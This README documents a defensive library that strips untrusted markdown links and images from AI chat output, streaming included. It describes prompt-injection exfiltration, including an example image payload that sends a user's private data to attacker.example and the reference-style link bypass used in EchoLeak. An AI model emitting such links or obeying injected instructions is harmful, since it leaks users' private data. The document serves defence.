# llm-markdown-guard

Stops your AI chat UI from leaking data through markdown links and images, including while the
answer is still streaming. It has no dependencies and works in browsers, Node, Deno, Bun and edge runtimes.

```js
import { sanitize } from "llm-markdown-guard";

const { markdown } = sanitize(modelOutput, { allowedHosts: ["docs.example.com", "*.cdn.example.com"] });
render(markdown); // your usual markdown renderer
```

## The attack

A prompt injection hidden in a web page, email, PDF or tool result tells the model to write:

```md
![](https://attacker.example/log?d=<the user's private data>)
```

The chat UI renders the image, the browser fetches it, and the data reaches the attacker. The user
doesn't need to click anything. The same trick works with links the user is tempted to click. This
is how [EchoLeak (CVE-2025-32711)](https://arxiv.org/abs/2509.10540) got data out of Microsoft 365
Copilot. Similar bugs have been found in other well-known AI assistants.

Patching single forms of the attack doesn't work. EchoLeak got past Copilot's link filter with
**reference-style** links (`![x][ref]` plus `[ref]: https://…` further down), which a simple regex
never sees. Markdown has many ways to produce a URL:

- inline links and images
- reference definitions
- `<autolinks>`
- bare URLs and emails that GFM links automatically
- raw HTML
- entity-encoded URLs (`&#104;ttps:`)
- protocol-relative URLs (`//host`)

## What it does

Every URL a markdown renderer could turn into a link or image is checked against your allowlist:

| In the model's output | Allowed host | Any other host |
| --- | --- | --- |
| `![alt](url)`, `![alt][ref]` | kept | replaced by the alt text |
| `[text](url)`, `[text][ref]` | kept | replaced by the text |
| `[ref]: url` definitions | kept | removed |
| `<https://…>` autolinks | kept | shown as plain text |
| bare `https://…`, `www.…`, `//…`, emails | kept | shown as plain text, not auto-linked |
| raw HTML (`<img src=…>`) | shown as text | shown as text |
| `javascript:`, `data:` and other schemes | removed | removed |

Code blocks and inline code are left alone, so `` `curl https://anything` `` still reads correctly.
Relative links (`/docs`, `#top`) are kept, since they point at your own site. The cleaned output is
still ordinary markdown for your existing renderer.

### Streaming

Most chat UIs re-render on every token. That makes cleaning the text afterwards too late: by then
the browser has already loaded the image. `createStream` returns only text that is final. A link
or image is held back until it is complete and has been checked, and everything else passes
straight through.

```js
import { createStream } from "llm-markdown-guard";

const guard = createStream({ allowedHosts: ["docs.example.com"] });
let shown = "";

for await (const token of llmStream) {
  shown += guard.write(token);
  render(shown);
}
shown += guard.end();
render(shown);
console.log(guard.removed); // what was taken out, and why
```

The streamed result is normally identical to running `sanitize` on the full text. In rare edge
cases, such as a link label split across lines, it escapes slightly differently, but it is just as
safe.

### How it is tested

- **Real renderers.** Each attack is rendered with three real markdown renderers (micromark with
  GFM, markdown-it, marked). The tests check that the final HTML contains no `src` or `href`
  pointing outside the allowlist.
- **Every streamed frame.** For streams, every intermediate frame a UI would render is checked, not
  just the final output.
- **Fuzzing.** A fuzzer builds random documents out of markdown syntax and checks them both whole
  and streamed in random chunks. Before release it ran over 500,000 documents with no leaks. The
  renderers don't always agree with each other; where they differ, the guard takes the safe
  reading.

## Options

```ts
sanitize(markdown, {
  allowedHosts: ["example.com", "*.example.com"], // "*." matches subdomains only. Default: none.
  allowRelative: true,     // keep "/docs", "#top"
  images: true,            // false removes every image, even on allowed hosts
  linkProtocols: ["http:", "https:"], // add "mailto:" to keep email links to allowed domains
  html: "escape",          // "keep" passes raw HTML through. Only safe if your renderer strips it.
  bareUrls: "escape",      // "keep" leaves bare URLs alone
  isAllowed: (url, kind) => false, // final say for URLs not on allowedHosts
  replaceImage: (alt, url) => alt, // what a removed image becomes
});
// → { markdown, removed: [{ kind, url, reason }] }

createStream({ ...sameOptions, maxHold: 4096 }); // most characters held back while waiting
```

`removed` lists each item that was taken out. Use it to log or alert, because an exfiltration
attempt means a prompt injection reached your model.

## Good to know

- **This is a safeguard for the output, not a prompt-injection detector.** It doesn't stop the
  model being manipulated. It removes the most common way the stolen data gets out. Also give the
  model as little data and as few tools as it needs.
- **Add a Content Security Policy** with a strict `img-src` as a second layer.
- **Allowed hosts are fully trusted.** An open redirect or user-uploaded content on an allowed host
  can still be abused, so keep the list short.
- **Bare domains without `www.` or a scheme** (`evil.com/x`) are only linked by renderers that guess
  links from plain text, such as markdown-it's `linkify` with `fuzzyLink` (on by default there). Turn
  `fuzzyLink` off, or render with micromark or marked, which don't do that.
- **Escaped text looks the same once rendered.** `https\://x` renders as `https://x`. The backslash
  only stops auto-linking. In unclear cases, such as backticks run straight into a URL, code is
  treated as text and may show a stray backslash.

## License

MIT
